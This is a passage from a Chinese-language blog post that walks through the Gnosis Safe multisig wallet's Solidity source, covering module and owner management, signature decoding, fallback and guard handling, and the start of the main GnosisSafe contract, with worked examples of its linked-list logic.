对应的地址赋值给最新的模块，然后将哨兵模块的值设置为最新添加的模块。 实际调用此函数，说明其用法： 12345678910/** 伪代码， 调用 enableMoudule 函数*/enableModule(0x3);enableModule(0x4);enableModule(0x5);/** 我们得到的结果 */modules[0x3] = 0x1;modules[0x4] = 0x3;modules[0x5] = 0x4;modules[0x1] = 0x5; 以上就是连续调用 该函数的赋值过程及结果。 解读 disableModule 函数： 实际调用函数实践 1234567891011121314/** 函数调用,假设执行如下两条执行 */disableModule(0x3,0x1);disableModule(0x4,0x3);// 第一条modules[0x3] = modules[0x1] = 0x5, modules[0x1] = 0x0// 剩下的模块链modules[0x3] = 0x5;modules[0x4] = 0x3;modules[0x5] = 0x4;// 第二条modules[0x4] = modules[0x3] = 0x5, modules[0x3] = 0x0// 剩下的模块链modules[0x4] = 0x5;modules[0x5] = 0x4; 以上就是连续调用 该函数的赋值过程及结果。 注：以上两个函数的都有authorized修饰符修饰，限制了函数调用者的身份。 解读 execTransactionFromModule 函数： 该函数实际上就是在调用 Executor合约中的 execute函数，但是该函数的调用者需要被添加到白名单中。 解读 execTransactionFromModuleReturnData函数： 同上一个函数差不多，只是多了一个返回值 returnData，细看其中的获取返回值的内联汇编部分。 12345678910111213assembly &#123; // Load free memory location let ptr := mload(0x40) // We allocate memory for the return data by setting the free memory location to // current free memory location + data size + 32 bytes for data size value mstore(0x40, add(ptr, add(returndatasize(), 0x20))) // Store the size mstore(ptr, returndatasize()) // Store the data returndatacopy(add(ptr, 0x20), 0, returndatasize()) // Point the return data to the correct memory location returnData := ptr &#125; 得到自由内存指针地址（存在0x40)。 将自由内存指针地址重新设定在当前地址 + 数据大小 + 长度前缀 的地址，多出来的空间（长度前缀 + 数据大小 ）为是了构造 返回值returnData。 写入长度前缀，从旧自由内存指针地址开始写入一个word(32字节），值为返回的数据大小。这里的返回数据哪来的呢？因为本函数调用了execTransactionFromModule函数，虽然execTransactionFromModule函数是个public函数，但是我们这里却只是内部跳转，并没有涉及到消息调用，因此你可以认为是execTransactionFromModule的代码直接复制了过来。而execTransactionFromModule又调用了execute，这同样是一个内部调用，因此返回值来源于execute的执行结果。 注意，这里只有消息调用（合约之间或者EOA与合约之间）才会有returndata，它并不是普通函数之间相互调用的返回值（函数返回值是Solidity语言）。 将returndata的内容复制到内存中，returndatacopy操作码我们已经多次见到，为什么从add(ptr, 0x20)开始呢，因为ptr开始的32字节我们在上一步存入了长度前缀。 最后设定返回Solidity返回数据returnData的内存地址，从prt开始分别为它的长度前缀和实际数据。 解读 getModulesPaginated 函数： 分页获取白名单模块，返回一个白名单数组。这里为什么要采用分页呢？因为理论上，可以注册个无数模块，因此返回的数据可以无限大。然而却是有gasLimit的，所以数组过大会导致调用失败，因此采用了分页模式，可以调整返回的数组大小和起始位置。 这里view类型的函数同样也会受到gas限制，同样也会gas超限。 本函数的逻辑使用了一个while从后向前循环模块链，取出分页大小的模块。如果不足（没有注册或者为哨兵模块），则立刻终止。 一个比较实用的技巧是最后的内嵌汇编，用来改变返回数组的大小。 123assembly &#123; mstore(array, moduleCount) &#125; 我们知道，数组在汇编中的内存layout也是值为内存地址，开始32字节存的是数组长度，后面再接数据内容。 由于我们分页获取的数组可能未填充满，比如取10个，我们只有4个。因此后面6个元素为空的。此时我们返回空元素的话会浪费空间。因此，可以直接修改返回的数据大小为4，这里就示例了一种直接修改方法。 直接将数组地址开始的32字节（存储数组大小）赋值为实际数组大小。这是一个很实用的技巧，我们平常在遇到数组不能填充满时也可以使用此技巧。 修改大小后本来返回10个元素的数组变成了返回4个元素的数组，而有效内容是相同的 1234567891011// 假如我们的模块链如下modules[0x3] = 0x1;modules[0x4] = 0x3;modules[0x5] = 0x4;modules[0x1] = 0x5;// 调用此函数getModulesPaginated(0x4,3)// 返回的array结果array = [0x3,0x1,0x5] 4. OwnerManager.sol有数据结构的底子就更好了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;../common/SelfAuthorized.sol&quot;;/// @title OwnerManager - Manages a set of owners and a threshold to perform actions./// @author Stefan George - &lt;stefan@gnosis.pm&gt;/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract OwnerManager is SelfAuthorized &#123; event AddedOwner(address owner); event RemovedOwner(address owner); event ChangedThreshold(uint256 threshold); address internal constant SENTINEL_OWNERS = address(0x1); // 存储某地址的owner的映射 mapping(address =&gt; address) internal owners; uint256 internal ownerCount; // owner数量 uint256 internal threshold; // 门槛 /// @dev Setup function sets initial storage of contract. /// @param _owners List of Safe owners. /// @param _threshold Number of required confirmations for a Safe transaction. function setupOwners(address[] memory _owners, uint256 _threshold) internal &#123; // Threshold can only be 0 at initialization. // Check ensures that setup function can only be called once. // 确保此函数只能被执行一次 require(threshold == 0, &quot;GS200&quot;); // Validate that threshold is smaller than number of added owners. require(_threshold &lt;= _owners.length, &quot;GS201&quot;); // There has to be at least one Safe owner. require(_threshold &gt;= 1, &quot;GS202&quot;); // Initializing Safe owners. address currentOwner = SENTINEL_OWNERS; /** 形成了一个环状链， SENTINEL_OWNERS -&gt; ... -&gt; SENTINEL_OWNERS */ for (uint256 i = 0; i &lt; _owners.length; i++) &#123; // Owner address cannot be null. address owner = _owners[i]; require(owner != address(0) &amp;&amp; owner != SENTINEL_OWNERS &amp;&amp; owner != address(this) &amp;&amp; currentOwner != owner, &quot;GS203&quot;); // No duplicate owners allowed. require(owners[owner] == address(0), &quot;GS204&quot;); // 限制了一个地址只能被添加一次 owners[currentOwner] = owner; currentOwner = owner; &#125; // 此时遍历到了最后一个索引，将 owners[last]指向SENTINEL_OWNERS owners[currentOwner] = SENTINEL_OWNERS; ownerCount = _owners.length; threshold = _threshold; &#125; /// @dev Allows to add a new owner to the Safe and update the threshold at the same time. /// This can only be done via a Safe transaction. /// @notice Adds the owner `owner` to the Safe and updates the threshold to `_threshold`. /// @param owner New owner address. /// @param _threshold New threshold. /** 和数据结构中单向循环链表的添加方式差不多 */ function addOwnerWithThreshold(address owner, uint256 _threshold) public authorized &#123; // Owner address cannot be null, the sentinel or the Safe itself. require(owner != address(0) &amp;&amp; owner != SENTINEL_OWNERS &amp;&amp; owner != address(this), &quot;GS203&quot;); // No duplicate owners allowed. require(owners[owner] == address(0), &quot;GS204&quot;); owners[owner] = owners[SENTINEL_OWNERS]; owners[SENTINEL_OWNERS] = owner; ownerCount++; emit AddedOwner(owner); // Change threshold if threshold was changed. if (threshold != _threshold) changeThreshold(_threshold); &#125; /// @dev Allows to remove an owner from the Safe and update the threshold at the same time. /// This can only be done via a Safe transaction. /// @notice Removes the owner `owner` from the Safe and updates the threshold to `_threshold`. /// @param prevOwner Owner that pointed to the owner to be removed in the linked list /// @param owner Owner address to be removed. /// @param _threshold New threshold. /** 数据结构单向循环链表 */ function removeOwner( address prevOwner, address owner, uint256 _threshold ) public authorized &#123; // Only allow to remove an owner, if threshold can still be reached. require(ownerCount - 1 &gt;= _threshold, &quot;GS201&quot;); // Validate owner address and check that it corresponds to owner index. require(owner != address(0) &amp;&amp; owner != SENTINEL_OWNERS, &quot;GS203&quot;); require(owners[prevOwner] == owner, &quot;GS205&quot;); owners[prevOwner] = owners[owner]; // pre 指向 owner.next owners[owner] = address(0); // 移除指针 ownerCount--; emit RemovedOwner(owner); // Change threshold if threshold was changed. if (threshold != _threshold) changeThreshold(_threshold); &#125; /// @dev Allows to swap/replace an owner from the Safe with another address. /// This can only be done via a Safe transaction. /// @notice Replaces the owner `oldOwner` in the Safe with `newOwner`. /// @param prevOwner Owner that pointed to the owner to be replaced in the linked list /// @param oldOwner Owner address to be replaced. /// @param newOwner New owner address. function swapOwner( address prevOwner, address oldOwner, address newOwner ) public authorized &#123; // Owner address cannot be null, the sentinel or the Safe itself. require(newOwner != address(0) &amp;&amp; newOwner != SENTINEL_OWNERS &amp;&amp; newOwner != address(this), &quot;GS203&quot;); // No duplicate owners allowed. require(owners[newOwner] == address(0), &quot;GS204&quot;); // Validate oldOwner address and check that it corresponds to owner index. require(oldOwner != address(0) &amp;&amp; oldOwner != SENTINEL_OWNERS, &quot;GS203&quot;); require(owners[prevOwner] == oldOwner, &quot;GS205&quot;); owners[newOwner] = owners[oldOwner]; owners[prevOwner] = newOwner; owners[oldOwner] = address(0); emit RemovedOwner(oldOwner); emit AddedOwner(newOwner); &#125; /// @dev Allows to update the number of required confirmations by Safe owners. /// This can only be done via a Safe transaction. /// @notice Changes the threshold of the Safe to `_threshold`. /// @param _threshold New threshold. function changeThreshold(uint256 _threshold) public authorized &#123; // Validate that threshold is smaller than number of owners. require(_threshold &lt;= ownerCount, &quot;GS201&quot;); // There has to be at least one Safe owner. require(_threshold &gt;= 1, &quot;GS202&quot;); threshold = _threshold; emit ChangedThreshold(threshold); &#125; function getThreshold() public view returns (uint256) &#123; return threshold; &#125; function isOwner(address owner) public view returns (bool) &#123; return owner != SENTINEL_OWNERS &amp;&amp; owners[owner] != address(0); &#125; /// @dev Returns array of owners. /// @return Array of Safe owners. function getOwners() public view returns (address[] memory) &#123; address[] memory array = new address[](ownerCount); // populate return array uint256 index = 0; address currentOwner = owners[SENTINEL_OWNERS]; while (currentOwner != SENTINEL_OWNERS) &#123; array[index] = currentOwner; currentOwner = owners[currentOwner]; index++; &#125; return array; &#125;&#125; **解读setupOwners**： 模拟一下，假定初始owner列表为[0x2,0x3,0x4]，初始门槛为3签2，那么两个参数分别为[0x2,0x3,0x4]与2。 执行setupOwners后的结果应该为: 123456owners[0x1]=0x2owners[0x2]=0x3owners[0x3]=0x4owners[0x4]=0x1ownerCount = 3threshold = 2 可以看到他们形成了一个闭环地址链。 注意For循环中有require来验证地址不能被添加2次，也不能添加零地址和哨兵地址（添加哨兵地址会使哨兵作用失效）。 最后记录了当前owners的数量，因为owners是个mapping，如果想得到它的记录数量必须使用一个新的状态变量来记录。 **解读addOwnerWithThreshold**： 这里的添加方式是：单个添加，哨兵指向新owner，新owner指向 owners[SENTINEL_OWNERS]，如果学过数据结构的话，很容易理解。 模拟一下，在上个函数的基础上，调用两次该函数，参数分别是：0x5 和 0x6 123456789// 如下是运行结果owners[0x1]=0x6owners[0x2]=0x3owners[0x3]=0x4owners[0x4]=0x1owners[0x5]=0x2owners[0x6]=0x5ownerCount = 5threshold = 2 这里有5个owner地址，因为哨兵地址0x1不算。它们和哨兵地址形成了一个闭环。SENTINEL_OWNERS可以理解为一个工具人，用来形成闭环的介质，方便代码的实现。 **解读removeOwner **： 类似数据结构单向循环链表的删除节点操作。 模拟一下，remove 0x03 0x04 3 。得到的结果如下： 1234567owners[0x1]=0x6owners[0x2]=0x3owners[0x3]=0x1owners[0x5]=0x2owners[0x6]=0x5ownerCount = 4threshold = 3 这里owner少了一个0x4，所以只有4个了，它们仍然和哨兵地址形成了一个闭环。 **解读swapOwner**： 类似数据结构中单向循环链表的替换操作。 要求是newOwner不能为address(0)，比较简单，不过多赘述。 **解读getOwners**： 以数组形式返回整个 owners映射链，其中也包含了哨兵 SENTINEL_OWNERS。 5. SignatureDecoder.sol该合约提供了一个解析签名的函数，名为signatureSplit，将签名解码为 r, s, v。我们可以通过r, s, v及以太坊签名消息来求得公钥。 12345678910111213141516171819202122232425262728293031323334353637// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title SignatureDecoder - Decodes signatures that a encoded as bytes/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract SignatureDecoder &#123; /// @dev divides bytes signature into `uint8 v, bytes32 r, bytes32 s`. /// @notice Make sure to peform a bounds check for @param pos, to avoid out of bounds access on @param signatures /// @param pos which signature to read. A prior bounds check of this parameter should be performed, to avoid out of bounds access /// @param signatures concatenated rsv signatures function signatureSplit(bytes memory signatures, uint256 pos) internal pure returns ( uint8 v, bytes32 r, bytes32 s ) &#123; // The signature format is a compact form of: // &#123;bytes32 r&#125;&#123;bytes32 s&#125;&#123;uint8 v&#125; // Compact means, uint8 is not padded to 32 bytes. // solhint-disable-next-line no-inline-assembly assembly &#123; let signaturePos := mul(0x41, pos) r := mload(add(signatures, add(signaturePos, 0x20))) s := mload(add(signatures, add(signaturePos, 0x40))) // Here we are loading the last 32 bytes, including 31 bytes // of &#x27;s&#x27;. There is no &#x27;mload8&#x27; to do this. // // &#x27;byte&#x27; is not working due to the Solidity parser, so lets // use the second best option, &#x27;and&#x27; v := and(mload(add(signatures, add(signaturePos, 0x41))), 0xff) &#125; &#125;&#125; 相关知识： 链接 6. SecuredTokenTransfer.sol该合约提供了了一个转账的方法，本质是调用 (&quot;transfer(address,uint256)&quot;)函数，这里采用了内联汇编的方法（其目的是为了能够得到返回值），比较简单，不熟悉的可以去看看 官方文档 。 123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title SecuredTokenTransfer - Secure token transfer/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract SecuredTokenTransfer &#123; /// @dev Transfers a token and returns if it was a success /// @param token Token that should be transferred /// @param receiver Receiver to whom the token should be transferred /// @param amount The amount of tokens that should be transferred function transferToken( address token, address receiver, uint256 amount ) internal returns (bool transferred) &#123; // 0xa9059cbb - keccack(&quot;transfer(address,uint256)&quot;) bytes memory data = abi.encodeWithSelector(0xa9059cbb, receiver, amount); // solhint-disable-next-line no-inline-assembly assembly &#123; // We write the return value to scratch space. // See https://docs.soliditylang.org/en/v0.7.6/internals/layout_in_memory.html#layout-in-memory let success := call(sub(gas(), 10000), token, 0, add(data, 0x20), mload(data), 0, 0x20) switch returndatasize() case 0 &#123; transferred := success &#125; case 0x20 &#123; transferred := iszero(or(iszero(success), iszero(mload(0)))) &#125; default &#123; transferred := 0 &#125; &#125; &#125;&#125; 7. ISignatureValidator.sol这是一个抽象函数，实现者必须要实现其 isValidSignature方法，且当成功调用 isValidSignature此函数时，必须要返回一个 bytes4 类型的值，且该值必须是 EIP1271_MAGIC_VALUE即0x20c13b0b。 123456789101112131415161718192021// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;contract ISignatureValidatorConstants &#123; // bytes4(keccak256(&quot;isValidSignature(bytes,bytes)&quot;) bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;&#125;abstract contract ISignatureValidator is ISignatureValidatorConstants &#123; /** * @dev Should return whether the signature provided is valid for the provided data * @param _data Arbitrary length data signed on the behalf of address(this) * @param _signature Signature byte array associated with _data * * MUST return the bytes4 magic value 0x20c13b0b when function passes. * MUST NOT modify state (using STATICCALL for solc &lt; 0.5, view modifier for solc &gt; 0.5) * MUST allow external calls */ function isValidSignature(bytes memory _data, bytes memory _signature) public view virtual returns (bytes4);&#125; 8. FallbackManager.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;../common/SelfAuthorized.sol&quot;;/// @title Fallback Manager - A contract that manages fallback calls made to this contract/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract FallbackManager is SelfAuthorized &#123; event ChangedFallbackHandler(address handler); // keccak256(&quot;fallback_manager.handler.address&quot;) bytes32 internal constant FALLBACK_HANDLER_STORAGE_SLOT = 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5; // 内部函数，使用内联汇编方式修改状态变量 FALLBACK_HANDLER_STORAGE_SLOT function internalSetFallbackHandler(address handler) internal &#123; bytes32 slot = FALLBACK_HANDLER_STORAGE_SLOT; // solhint-disable-next-line no-inline-assembly assembly &#123; sstore(slot, handler) &#125; &#125; /// @dev Allows to add a contract to handle fallback calls. /// Only fallback calls without value and with data will be forwarded. /// This can only be done via a Safe transaction. /// @param handler contract to handle fallbacks calls. // 设置新的 handeler，但只能是本合约对象才能调用 function setFallbackHandler(address handler) public authorized &#123; internalSetFallbackHandler(handler); emit ChangedFallbackHandler(handler); &#125; // solhint-disable-next-line payable-fallback,no-complex-fallback /** 回调函数，执行data中的命令（函数） */ fallback() external &#123; bytes32 slot = FALLBACK_HANDLER_STORAGE_SLOT; // solhint-disable-next-line no-inline-assembly assembly &#123; let handler := sload(slot) if iszero(handler) &#123; return(0, 0) &#125; calldatacopy(0, 0, calldatasize()) // The msg.sender address is shifted to the left by 12 bytes to remove the padding // Then the address without padding is stored right after the calldata mstore(calldatasize(), shl(96, caller())) // Add 20 bytes for the address appended add the end let success := call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0) returndatacopy(0, 0, returndatasize()) if iszero(success) &#123; revert(0, returndatasize()) &#125; return(0, returndatasize()) &#125; &#125;&#125; 解读fallback(): 和代理合约很像，该函数的功能是调用 handler 中 data 指定的命令。 代理合约相关知识，可移步到 这里 9. StorageAccessible.sol12345678910111213141516171819202122232425262728293031```&gt; **解读`getStorageAt`:**&gt;&gt; 挨个读取合约中slot的值。&gt;&gt; 举例说明：&gt;&gt; ```solidity&gt; // SPDX-License-Identifier: MIT&gt; pragma solidity ^0.8.0;&gt; &gt; contract StorageAt &#123;&gt; &gt; address private solt0 = msg.sender; &gt; uint private solt1 = 9;&gt; string private solt2 = unicode&quot;不良人&quot;;&gt; bytes private solt3 = &quot;biyou&quot;;&gt; &gt; function getStorageAt(uint256 offset, uint256 length) public view returns (bytes memory) &#123;&gt; bytes memory result = new bytes(length * 32); // 创建一个长度为 length * 32的数组&gt; for (uint256 index = 0; index &lt; length; index++) &#123;&gt; // solhint-disable-next-line no-inline-assembly&gt; assembly &#123;&gt; let word := sload(add(offset, index)) // 每次移动32bytes&gt; mstore(add(add(result, 0x20), mul(index, 0x20)), word)&gt; &#125;&gt; &#125;&gt; return result;&gt; &#125;&gt; &#125; 运行结果： 解读simulateAndRevert： 执行一个委托调用操作，使用 delegatecall 指令将当前合约的上下文传递给目标合约，并将 calldataPayload 作为调用数据传递给目标合约。 使用 mstore 指令将调用结果的布尔值（表示调用是否成功）存储在内存地址 0x00 处。 使用 mstore 指令将调用结果的字节数（即 returndatasize()）存储在内存地址 0x20 处。 使用 returndatacopy 指令将调用结果的字节流（即 returndata）从返回数据缓冲区复制到内存地址 0x40 处。 使用 revert 指令将当前合约的执行回滚，并将调用结果作为回滚数据返回。具体来说，将内存地址 0x00 处的布尔值、内存地址 0x20 处的字节数和内存地址 0x40 处的字节流作为回滚数据返回。 （该函数是AI解读，暂时有点搞不懂） 10. GuardManager.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;../common/Enum.sol&quot;;import &quot;../common/SelfAuthorized.sol&quot;;interface Guard &#123; function checkTransaction( address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes memory signatures, address msgSender ) external; function checkAfterExecution(bytes32 txHash, bool success) external;&#125;/// @title Fallback Manager - A contract that manages fallback calls made to this contract/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract GuardManager is SelfAuthorized &#123; event ChangedGuard(address guard); // keccak256(&quot;guard_manager.guard.address&quot;) bytes32 internal constant GUARD_STORAGE_SLOT = 0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8; /// @dev Set a guard that checks transactions before execution /// @param guard The address of the guard to be used or the 0 address to disable the guard function setGuard(address guard) external authorized &#123; bytes32 slot = GUARD_STORAGE_SLOT; // solhint-disable-next-line no-inline-assembly assembly &#123; sstore(slot, guard) &#125; emit ChangedGuard(guard); &#125; function getGuard() internal view returns (address guard) &#123; bytes32 slot = GUARD_STORAGE_SLOT; // solhint-disable-next-line no-inline-assembly assembly &#123; guard := sload(slot) &#125; &#125;&#125; 解读： 这个合约很简单，有点内联汇编知识的应该很容易理解。 setGuard：使用汇编语言修改状态变量； getGuard: 使用汇编语言读取状态变量。 到此，GnosisSafe继承的所有父合约都过了一遍。一天也差不多了过去了，水平有限，出错也是难免的，欢迎大佬们给我纠错。 解读GnosisSafe合约这是一个代理合约。 1. 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;./base/ModuleManager.sol&quot;;import &quot;./base/OwnerManager.sol&quot;;import &quot;./base/FallbackManager.sol&quot;;import &quot;./base/GuardManager.sol&quot;;import &quot;./common/EtherPaymentFallback.sol&quot;;import &quot;./common/Singleton.sol&quot;;import &quot;./common/SignatureDecoder.sol&quot;;import &quot;./common/SecuredTokenTransfer.sol&quot;;import &quot;./common/StorageAccessible.sol&quot;;import &quot;./interfaces/ISignatureValidator.sol&quot;;import &quot;./external/GnosisSafeMath.sol&quot;;/// @title Gnosis Safe - A multisignature wallet with support for confirmations using signed messages based on ERC191./// @author Stefan George - &lt;stefan@gnosis.io&gt;/// @author Richard Meissner - &lt;richard@gnosis.io&gt;contract GnosisSafe is EtherPaymentFallback, Singleton, ModuleManager, OwnerManager, SignatureDecoder, SecuredTokenTransfer, ISignatureValidatorConstants, FallbackManager, StorageAccessible, GuardManager&#123; using GnosisSafeMath for uint256; string public constant VERSION = &quot;1.3.0&quot;; // keccak256( // &quot;EIP712Domain(uint256 chainId,address verifyingContract)&quot; // ); // 签名是使用 EIP712 签名标志 bytes32 private constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218; // keccak256( // &quot;SafeTx(address to,uint256 value,bytes data,uint8 operation,uint256 safeTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)&quot; // ); bytes32 private constant SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8; event SafeSetup(address indexed initiator, address[] owners, uint256 threshold, address initializer, address fallbackHandler); event ApproveHash(bytes32 indexed approvedHash, address indexed owner); event SignMsg(bytes32 indexed msgHash); event ExecutionFailure(bytes32 txHash, uint256 payment); event ExecutionSuccess(bytes32 txHash, uint256 payment); uint256 public nonce; bytes32 private _deprecatedDomainSeparator; // Mapping to keep track of all message hashes that have been approve by ALL REQUIRED owners mapping(bytes32 =&gt; uint256) public signedMessages; // Mapping to keep track of all hashes (message or transaction) that have been approve by ANY owners mapping(address =&gt; mapping(bytes32 =&gt; uint256)) public approvedHashes; // This constructor ensures that this contract can only be used as a master copy for Proxy contracts // 此构造函数确保此协定只能用作代理协定的主副本 constructor() &#123; // By setting the threshold it is not possible to call setup anymore, // so we create a Safe with 0 owners and threshold 1. // This is an unusable Safe, perfect for the singleton threshold = 1; // 设置门槛为1,本身将不能调用自身的setup函数 &#125; /// @dev Setup function sets initial storage of contract. /// @param _owners List of Safe owners. /// @param _threshold Number of required confirmations for a Safe transaction. /// @param to Contract address for optional delegate call. /// @param data Data payload for optional delegate call. /// @param fallbackHandler Handler for fallback calls to this contract /// @param paymentToken Token that should be used for the payment (0 is ETH) /// @param payment Value that should be paid /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin) function setup( address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver ) external &#123; // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice // 如果该合约被初始化了，则 setupOwners 无法调用成功 setupOwners(_owners, _threshold); // 如果 fallbackHandler 不为0地址，则修改 fallbackHandler的值 if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler); // As setupOwners can only be called if the contract has not been initialized we don&#x27;t need a check for setupModules setupModules(to, data); // 初始化Module，并执行委托调用 if (payment &gt; 0) &#123; // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself) // baseGas = 0, gasPrice = 1 and gas = payment =&gt; amount = (payment + 0) * 1 = payment // paymentToken如果是代币地址，则调用transfer函数，如果是address(0)，则是发送 ETH handlePayment(payment, 0, 1, paymentToken, paymentReceiver); &#125; emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler); &#125; /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction. /// Note: The fees are always transferred, even if the user transaction fails. /// @param to Destination address of Safe transaction. /// @param value Ether value of Safe transaction. /// @param data Data payload of Safe transaction. /// @param operation Operation type of Safe transaction. /// @param safeTxGas Gas that should be used for the Safe transaction. /// @param baseGas Gas costs that are independent of the transaction execution(e.g. base transaction fee, signature check, payment of the refund) /// @param gasPrice Gas price that should be used for the payment calculation. /// @param gasToken Token address (or 0 if ETH) that is used for the payment. /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin). /// @param signatures Packed signature data (&#123;bytes32 r&#125;&#123;bytes32 s&#125;&#123;uint8 v&#125;) function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes memory signatures ) public payable virtual returns (bool success) &#123; bytes32 txHash; // Use scope here to limit variable lifetime and prevent `stack too deep` errors &#123; bytes memory txHashData = encodeTransactionData( // 将交易信息打包好 // Transaction info to, value, data, operation, safeTxGas, // Payment info baseGas, gasPrice, gasToken, refundReceiver, // Signature info nonce ); // Increase nonce and execute transaction. nonce++; // 随机数自增 txHash = keccak256(txHashData); // 再对交易信息进行一次hash checkSignatures(txHash, txHashData, signatures); &#125; address guard = getGuard(); &#123; if (guard != address(0)) &#123; Guard(guard).checkTransaction( // Transaction info to, value, data, operation, safeTxGas, // Payment info baseGas, gasPrice, gasToken, refundReceiver, // Signature info signatures, msg.sender ); &#125; &#125; // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500) // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150 require(gasleft() &gt;= ((safeTxGas * 64) / 63).max(safeTxGas + 2500) + 500, &quot;GS010&quot;); // Use scope here to limit variable lifetime and prevent `stack too deep` errors &#123; uint256 gasUsed = gasleft(); // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than safeTxGas) // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than safeTxGas success = execute(to, value, data, operation, gasPrice == 0 ? (gasleft() - 2500) : safeTxGas); gasUsed = gasUsed.sub(gasleft()); // If no safeTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn&#x27;t revert require(success || safeTxGas != 0 || gasPrice != 0, &quot;GS013&quot;); // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls uint256 payment = 0; if (gasPrice &gt; 0) &#123; payment = handlePayment(gasUsed, baseGas, gasPrice, gasToken, refundReceiver); &#125; if (success) emit ExecutionSuccess(txHash, payment); else emit ExecutionFailure(txHash, payment); &#125; &#123; if (guard != address(0)) &#123; Guard(guard).checkAfterExecution(txHash, success); &#125; &#125; &#125; function handlePayment( uint256 gasUsed, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver ) private returns (uint256 payment) &#123; // solhint-disable-next-line avoid-tx-origin address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver; if (gasToken == address(0)) &#123; // For ETH we will only adjust the gas price to not be higher than the actual used gas price payment = gasUsed.add(baseGas).mul(gasPrice &lt; tx.gasprice ? gasPrice : tx.gasprice); require(receiver.send(payment), &quot;GS011&quot;); &#125; else &#123; payment = gasUsed.add(baseGas).mul(gasPrice); require(transferToken(gasToken, receiver, payment), &quot;GS012&quot;); &#125; &#125; /** * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise. * @param dataHash Hash of the data (could be either a message hash or transaction hash) * @param data That should be signed (this is passed to an external validator contract) * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash. */ function checkSignatures( bytes32 dataHash, bytes memory data, bytes memory signatures ) public view &#123; // Load threshold to avoid multiple storage loads uint256 _threshold = threshold; // Check that a threshold is set require(_threshold &gt; 0, &quot;GS001&quot;); checkNSignatures(dataHash, data, signatures, _threshold); &#125; /** * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise. * @param dataHash Hash of the data (could be either a message hash or transaction hash) * @param data That should be signed (this is passed to an external validator contract) * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash. * @param requiredSignatures Amount of required valid signatures. */ function checkNSignatures( bytes32 dataHash, bytes memory data, bytes memory signatures, uint256 requiredSignatures ) public view &#123; // Check that the provided signature data is not too short require(signatures.length &gt;= requiredSignatures.mul(65), &quot;GS020&quot;); // There cannot be an owner with address 0. address lastOwner = address(0); address currentOwner; uint8 v; bytes32 r; bytes32 s; 